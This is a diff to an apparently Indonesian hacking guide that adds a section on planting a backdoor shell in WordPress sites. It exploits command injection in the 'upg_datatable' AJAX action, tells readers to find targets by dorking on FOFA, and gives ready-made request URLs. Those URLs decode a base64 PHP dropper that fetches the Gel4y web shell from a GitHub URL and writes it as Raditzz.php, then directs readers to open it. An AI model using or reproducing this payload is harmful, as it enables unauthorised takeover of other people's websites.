@@ -36,4 +36,24 @@ Karena di sini susah dan gak nampak code, jadi aku bikin di link aja, ini linkny
 https://pastebin.com/xZuKHARA
 ```
 
+# C. Tanem shell backdoor
+# Code buat tanem
+```
+"wp-admin/admin-ajax.php?action=upg_datatable"
+```
+Dorkingan untuk mencari target 
+Search di website fofa
+```
+https://en.fofa.info/
+```
+```
+wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:id
+```
+```
+wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:echo PD9waHAgJGY9J2dlbDR5LnBocCc7JHU9J2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8yMlhwbG9pdGVyQ3Jldy1UZWFtL0dlbDR5LU1pbmktU2hlbGwtQmFja2Rvb3IvcmVmcy9oZWFkcy8xLngueC9nZWw0eS5waHAnO2lmKCFmaWxlX2V4aXN0cygkZikpZmlsZV9wdXRfY29udGVudHMoJGYsZmlsZV9nZXRfY29udGVudHMoJHUpKTtpbmNsdWRlKCRmKTs/Pg==|base64 -d > Raditzz.jpg:NULL
+```
+```
+wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:echo PD9waHAgJGY9J2dlbDR5LnBocCc7JHU9J2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS8yMlhwbG9pdGVyQ3Jldy1UZWFtL0dlbDR5LU1pbmktU2hlbGwtQmFja2Rvb3IvcmVmcy9oZWFkcy8xLngueC9nZWw0eS5waHAnO2lmKCFmaWxlX2V4aXN0cygkZikpZmlsZV9wdXRfY29udGVudHMoJGYsZmlsZV9nZXRfY29udGVudHMoJHUpKTtpbmNsdWRlKCRmKTs/Pg==|base64 -d > Raditzz.php:NULL
+```
+edit link setelah "/wp-admin/Raditzz.php
 # Raditzz
